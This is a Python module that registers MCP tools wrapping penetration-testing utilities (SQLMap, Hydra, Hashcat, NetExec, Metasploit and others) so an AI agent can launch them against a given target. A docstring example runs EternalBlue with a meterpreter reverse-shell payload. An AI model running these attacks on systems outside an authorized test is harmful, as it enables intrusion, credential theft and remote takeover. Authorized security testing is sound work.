# mcp_tools/additional_security_tools.py

from typing import Dict, Any

def register_additional_security_tools(mcp, hexstrike_client, logger):
    @mcp.tool()
    def dirb_scan(url: str, wordlist: str = "/usr/share/wordlists/dirb/common.txt", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute Dirb for directory brute forcing with enhanced logging.

        Args:
            url: The target URL
            wordlist: Path to wordlist file
            additional_args: Additional Dirb arguments

        Returns:
            Scan results with enhanced telemetry
        """
        data = {
            "url": url,
            "wordlist": wordlist,
            "additional_args": additional_args
        }
        logger.info(f"📁 Starting Dirb scan: {url}")
        result = hexstrike_client.safe_post("api/tools/dirb", data)
        if result.get("success"):
            logger.info(f"✅ Dirb scan completed for {url}")
        else:
            logger.error(f"❌ Dirb scan failed for {url}")
        return result

    @mcp.tool()
    def nikto_scan(target: str, additional_args: str = "") -> Dict[str, Any]:
        """
        Execute Nikto web vulnerability scanner with enhanced logging.

        Args:
            target: The target URL or IP
            additional_args: Additional Nikto arguments

        Returns:
            Scan results with discovered vulnerabilities
        """
        data = {
            "target": target,
            "additional_args": additional_args
        }
        logger.info(f"🔬 Starting Nikto scan: {target}")
        result = hexstrike_client.safe_post("api/tools/nikto", data)
        if result.get("success"):
            logger.info(f"✅ Nikto scan completed for {target}")
        else:
            logger.error(f"❌ Nikto scan failed for {target}")
        return result

    @mcp.tool()
    def sqlmap_scan(url: str, data: str = "", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute SQLMap for SQL injection testing with enhanced logging.

        Args:
            url: The target URL
            data: POST data for testing
            additional_args: Additional SQLMap arguments

        Returns:
            SQL injection test results
        """
        data_payload = {
            "url": url,
            "data": data,
            "additional_args": additional_args
        }
        logger.info(f"💉 Starting SQLMap scan: {url}")
        result = hexstrike_client.safe_post("api/tools/sqlmap", data_payload)
        if result.get("success"):
            logger.info(f"✅ SQLMap scan completed for {url}")
        else:
            logger.error(f"❌ SQLMap scan failed for {url}")
        return result

    @mcp.tool()
    def metasploit_run(module: str, options: Dict[str, Any] = {}) -> Dict[str, Any]:
        """
        Execute a Metasploit module with enhanced logging.

        Args:
            module: The Metasploit module to use (e.g., "exploit/windows/smb/ms17_010_eternalblue").
            options: Dictionary of module options. Required options depend on the module type:
                - For exploits: Common required options include 'RHOST', 'RPORT', 'PAYLOAD', etc.
                - For auxiliary modules: Options may include 'TARGET', 'THREADS', etc.
                - For post modules: Options depend on the session and target.

        Returns:
            Metasploit execution results.

        Example:
            metasploit_run(
                module="exploit/windows/smb/ms17_010_eternalblue",
                options={
                    "RHOST": "192.168.1.10",
                    "RPORT": 445,
                    "PAYLOAD": "windows/x64/meterpreter/reverse_tcp",
                    "LHOST": "192.168.1.100",
                    "LPORT": 4444
                }
            )

        Note:
            Refer to Metasploit module documentation for the full list of required and optional parameters.
            All required options must be provided in the 'options' dictionary for successful execution.
        """
        data = {
            "module": module,
            "options": options
        }
        logger.info(f"🚀 Starting Metasploit module: {module}")
        result = hexstrike_client.safe_post("api/tools/metasploit", data)
        if result.get("success"):
            logger.info(f"✅ Metasploit module completed: {module}")
        else:
            logger.error(f"❌ Metasploit module failed: {module}")
        return result

    @mcp.tool()
    def hydra_attack(
        target: str,
        service: str,
        username: str = "",
        username_file: str = "",
        password: str = "",
        password_file: str = "",
        additional_args: str = ""
    ) -> Dict[str, Any]:
        """
        Execute Hydra for password brute forcing with enhanced logging.

        Args:
            target: The target IP or hostname
            service: The service to attack (ssh, ftp, http, etc.)
            username: Single username to test
            username_file: File containing usernames
            password: Single password to test
            password_file: File containing passwords
            additional_args: Additional Hydra arguments

        Returns:
            Brute force attack results
        """
        data = {
            "target": target,
            "service": service,
            "username": username,
            "username_file": username_file,
            "password": password,
            "password_file": password_file,
            "additional_args": additional_args
        }
        logger.info(f"🔑 Starting Hydra attack: {target}:{service}")
        result = hexstrike_client.safe_post("api/tools/hydra", data)
        if result.get("success"):
            logger.info(f"✅ Hydra attack completed for {target}")
        else:
            logger.error(f"❌ Hydra attack failed for {target}")
        return result

    @mcp.tool()
    def john_crack(
        hash_file: str,
        wordlist: str = "/usr/share/wordlists/rockyou.txt",
        format_type: str = "",
        additional_args: str = ""
    ) -> Dict[str, Any]:
        """
        Execute John the Ripper for password cracking with enhanced logging.

        Args:
            hash_file: File containing password hashes
            wordlist: Wordlist file to use
            format_type: Hash format type
            additional_args: Additional John arguments

        Returns:
            Password cracking results
        """
        data = {
            "hash_file": hash_file,
            "wordlist": wordlist,
            "format": format_type,
            "additional_args": additional_args
        }
        logger.info(f"🔐 Starting John the Ripper: {hash_file}")
        result = hexstrike_client.safe_post("api/tools/john", data)
        if result.get("success"):
            logger.info(f"✅ John the Ripper completed")
        else:
            logger.error(f"❌ John the Ripper failed")
        return result

    @mcp.tool()
    def wpscan_analyze(url: str, additional_args: str = "") -> Dict[str, Any]:
        """
        Execute WPScan for WordPress vulnerability scanning with enhanced logging.

        Args:
            url: The WordPress site URL
            additional_args: Additional WPScan arguments

        Returns:
            WordPress vulnerability scan results
        """
        data = {
            "url": url,
            "additional_args": additional_args
        }
        logger.info(f"🔍 Starting WPScan: {url}")
        result = hexstrike_client.safe_post("api/tools/wpscan", data)
        if result.get("success"):
            logger.info(f"✅ WPScan completed for {url}")
        else:
            logger.error(f"❌ WPScan failed for {url}")
        return result

    @mcp.tool()
    def enum4linux_scan(target: str, additional_args: str = "-a") -> Dict[str, Any]:
        """
        Execute Enum4linux for SMB enumeration with enhanced logging.

        Args:
            target: The target IP address
            additional_args: Additional Enum4linux arguments

        Returns:
            SMB enumeration results
        """
        data = {
            "target": target,
            "additional_args": additional_args
        }
        logger.info(f"🔍 Starting Enum4linux: {target}")
        result = hexstrike_client.safe_post("api/tools/enum4linux", data)
        if result.get("success"):
            logger.info(f"✅ Enum4linux completed for {target}")
        else:
            logger.error(f"❌ Enum4linux failed for {target}")
        return result

    @mcp.tool()
    def ffuf_scan(url: str, wordlist: str = "/usr/share/wordlists/dirb/common.txt", mode: str = "directory", match_codes: str = "200,204,301,302,307,401,403", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute FFuf for web fuzzing with enhanced logging.

        Args:
            url: The target URL
            wordlist: Wordlist file to use
            mode: Fuzzing mode (directory, vhost, parameter)
            match_codes: HTTP status codes to match
            additional_args: Additional FFuf arguments

        Returns:
            Web fuzzing results
        """
        data = {
            "url": url,
            "wordlist": wordlist,
            "mode": mode,
            "match_codes": match_codes,
            "additional_args": additional_args
        }
        logger.info(f"🔍 Starting FFuf {mode} fuzzing: {url}")
        result = hexstrike_client.safe_post("api/tools/ffuf", data)
        if result.get("success"):
            logger.info(f"✅ FFuf fuzzing completed for {url}")
        else:
            logger.error(f"❌ FFuf fuzzing failed for {url}")
        return result

    @mcp.tool()
    def netexec_scan(target: str, protocol: str = "smb", username: str = "", password: str = "", hash_value: str = "", module: str = "", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute NetExec (formerly CrackMapExec) for network enumeration with enhanced logging.

        Args:
            target: The target IP or network
            protocol: Protocol to use (smb, ssh, winrm, etc.)
            username: Username for authentication
            password: Password for authentication
            hash_value: Hash for pass-the-hash attacks
            module: NetExec module to execute
            additional_args: Additional NetExec arguments

        Returns:
            Network enumeration results
        """
        data = {
            "target": target,
            "protocol": protocol,
            "username": username,
            "password": password,
            "hash": hash_value,
            "module": module,
            "additional_args": additional_args
        }
        logger.info(f"🔍 Starting NetExec {protocol} scan: {target}")
        result = hexstrike_client.safe_post("api/tools/netexec", data)
        if result.get("success"):
            logger.info(f"✅ NetExec scan completed for {target}")
        else:
            logger.error(f"❌ NetExec scan failed for {target}")
        return result

    @mcp.tool()
    def amass_scan(domain: str, mode: str = "enum", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute Amass for subdomain enumeration with enhanced logging.

        Args:
            domain: The target domain
            mode: Amass mode (enum, intel, viz)
            additional_args: Additional Amass arguments

        Returns:
            Subdomain enumeration results
        """
        data = {
            "domain": domain,
            "mode": mode,
            "additional_args": additional_args
        }
        logger.info(f"🔍 Starting Amass {mode}: {domain}")
        result = hexstrike_client.safe_post("api/tools/amass", data)
        if result.get("success"):
            logger.info(f"✅ Amass completed for {domain}")
        else:
            logger.error(f"❌ Amass failed for {domain}")
        return result

    @mcp.tool()
    def hashcat_crack(hash_file: str, hash_type: str, attack_mode: str = "0", wordlist: str = "/usr/share/wordlists/rockyou.txt", mask: str = "", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute Hashcat for advanced password cracking with enhanced logging.

        Args:
            hash_file: File containing password hashes
            hash_type: Hash type number for Hashcat
            attack_mode: Attack mode (0=dict, 1=combo, 3=mask, etc.)
            wordlist: Wordlist file for dictionary attacks
            mask: Mask for mask attacks
            additional_args: Additional Hashcat arguments

        Returns:
            Password cracking results
        """
        data = {
            "hash_file": hash_file,
            "hash_type": hash_type,
            "attack_mode": attack_mode,
            "wordlist": wordlist,
            "mask": mask,
            "additional_args": additional_args
        }
        logger.info(f"🔐 Starting Hashcat attack: mode {attack_mode}")
        result = hexstrike_client.safe_post("api/tools/hashcat", data)
        if result.get("success"):
            logger.info(f"✅ Hashcat attack completed")
        else:
            logger.error(f"❌ Hashcat attack failed")
        return result

    @mcp.tool()
    def subfinder_scan(domain: str, silent: bool = True, all_sources: bool = False, additional_args: str = "") -> Dict[str, Any]:
        """
        Execute Subfinder for passive subdomain enumeration with enhanced logging.

        Args:
            domain: The target domain
            silent: Run in silent mode
            all_sources: Use all sources
            additional_args: Additional Subfinder arguments

        Returns:
            Passive subdomain enumeration results
        """
        data = {
            "domain": domain,
            "silent": silent,
            "all_sources": all_sources,
            "additional_args": additional_args
        }
        logger.info(f"🔍 Starting Subfinder: {domain}")
        result = hexstrike_client.safe_post("api/tools/subfinder", data)
        if result.get("success"):
            logger.info(f"✅ Subfinder completed for {domain}")
        else:
            logger.error(f"❌ Subfinder failed for {domain}")
        return result

    @mcp.tool()
    def smbmap_scan(target: str, username: str = "", password: str = "", domain: str = "", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute SMBMap for SMB share enumeration with enhanced logging.

        Args:
            target: The target IP address
            username: Username for authentication
            password: Password for authentication
            domain: Domain for authentication
            additional_args: Additional SMBMap arguments

        Returns:
            SMB share enumeration results
        """
        data = {
            "target": target,
            "username": username,
            "password": password,
            "domain": domain,
            "additional_args": additional_args
        }
        logger.info(f"🔍 Starting SMBMap: {target}")
        result = hexstrike_client.safe_post("api/tools/smbmap", data)
        if result.get("success"):
            logger.info(f"✅ SMBMap completed for {target}")
        else:
            logger.error(f"❌ SMBMap failed for {target}")
        return result
